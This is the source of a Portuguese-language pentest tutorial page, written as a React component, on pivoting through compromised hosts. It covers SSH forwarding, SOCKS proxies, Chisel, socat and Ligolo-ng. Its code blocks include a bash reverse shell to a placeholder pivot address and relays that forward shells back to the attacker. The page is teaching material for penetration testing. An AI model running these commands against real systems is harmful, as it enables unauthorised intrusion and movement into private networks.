import { PageContainer } from "@/components/layout/PageContainer";
  import { AlertBox } from "@/components/ui/AlertBox";
  import { CodeBlock } from "@/components/ui/CodeBlock";

  export default function SSHTunneling() {
    return (
      <PageContainer
        title="Pivoting — SSH Tunneling e Port Forwarding"
        subtitle="Use SSH para criar túneis e acessar redes internas inacessíveis através de hosts comprometidos."
        difficulty="avancado"
        timeToRead="14 min"
      >
        <AlertBox type="info" title="Fundamental em pentests reais">
          Pivoting é a técnica de usar um host comprometido como trampolim para atacar
          hosts em redes internas que você não consegue acessar diretamente.
        </AlertBox>

        <h2>Local Port Forwarding (-L)</h2>
        <CodeBlock language="bash" code={'# Acessar serviço na rede interna através do host comprometido\n# Sintaxe: -L PORTA_LOCAL:HOST_DESTINO:PORTA_DESTINO\n\n# Exemplo: acessar o MySQL (porta 3306) de 10.10.10.50\n# que só é acessível a partir do servidor pivot 192.168.1.10\nssh -L 3306:10.10.10.50:3306 usuario@192.168.1.10\n\n# Agora, no Kali, acesse localhost:3306 e você verá o MySQL de 10.10.10.50\nmysql -h 127.0.0.1 -P 3306 -u root -p\n\n# Múltiplos forwards\nssh -L 3306:10.10.10.50:3306 -L 8080:10.10.10.60:80 usuario@pivot'} />

        <h2>Remote Port Forwarding (-R)</h2>
        <CodeBlock language="bash" code={'# Fazer a vítima se conectar de volta ao Kali\n# Útil quando você está dentro de uma rede NAT\n\n# Na vítima/pivot:\nssh -R 4444:localhost:4444 atacante@SEU_IP\n\n# Agora qualquer conexão em SEU_IP:4444 vai para localhost:4444 da vítima\n# Use para receber reverse shells de redes internas\n\n# No Kali, ouvir\nnc -lvnp 4444'} />

        <h2>Dynamic Port Forwarding (SOCKS Proxy)</h2>
        <CodeBlock language="bash" code={'# Criar proxy SOCKS5 através do servidor comprometido\nssh -D 1080 usuario@192.168.1.10\n\n# Configurar proxychains para usar o proxy\nnano /etc/proxychains4.conf\n# Adicionar no final:\n# socks5 127.0.0.1 1080\n\n# Usar proxychains para rotear qualquer comando pela rede interna\nproxychains nmap -sT -Pn 10.10.10.0/24\nproxychains curl http://10.10.10.50/\nproxychains firefox &'} />

        <h2>Chisel — Tunneling Sem SSH</h2>
        <CodeBlock language="bash" code={'# Chisel funciona via HTTP — útil quando SSH está bloqueado\n\n# Instalar\nsudo apt install chisel -y\n# ou baixar binário: https://github.com/jpillora/chisel/releases\n\n# SERVIDOR (Kali)\nchisel server -p 8080 --reverse\n\n# CLIENTE (vítima/pivot) — forward tunnel\n./chisel client SEU_IP:8080 R:3306:10.10.10.50:3306\n\n# CLIENTE — SOCKS proxy reverso\n./chisel client SEU_IP:8080 R:1080:socks\n\n# Configurar proxychains no Kali\necho "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf\nproxychains nmap -sT -Pn 10.10.10.50'} />

        <h2>Socat — Relay de Portas</h2>
        <CodeBlock language="bash" code={'# Instalar\nsudo apt install socat -y\n\n# Port relay simples (na máquina pivot)\nsocat TCP-LISTEN:8080,fork TCP:10.10.10.50:80\n\n# Relay de shell reverso\n# No pivot: redirecionar porta 4445 para Kali:4444\nsocat TCP-LISTEN:4445,fork TCP:SEU_IP:4444\n\n# Na vítima interna: conectar ao pivot\nbash -i >& /dev/tcp/IP_PIVOT/4445 0>&1'} />

        <h2>Ligolo-ng — Pivoting Moderno</h2>
        <CodeBlock language="bash" code={'# Ligolo-ng: pivoting moderno com interface TUN\n# https://github.com/nicocha30/ligolo-ng\n\n# SERVIDOR (Kali)\nsudo ip tuntap add user kali mode tun ligolo\nsudo ip link set ligolo up\n./proxy -selfcert -laddr 0.0.0.0:11601\n\n# CLIENTE (pivot)\n./agent -connect SEU_IP:11601 -ignore-cert\n\n# No servidor, adicionar rota\n# ligolo-ng> session (selecionar)\n# ligolo-ng> start\nsudo ip route add 10.10.10.0/24 dev ligolo\n\n# Agora acesse 10.10.10.x diretamente!'} />

        <AlertBox type="success" title="Escolhendo a ferramenta certa">
          SSH com -D: mais simples, requer SSH aberto. Chisel: via HTTP, funciona em quase todos os casos.
          Ligolo-ng: mais rápido e transparente, ideal para pentests complexos.
        </AlertBox>
      </PageContainer>
    );
  }
  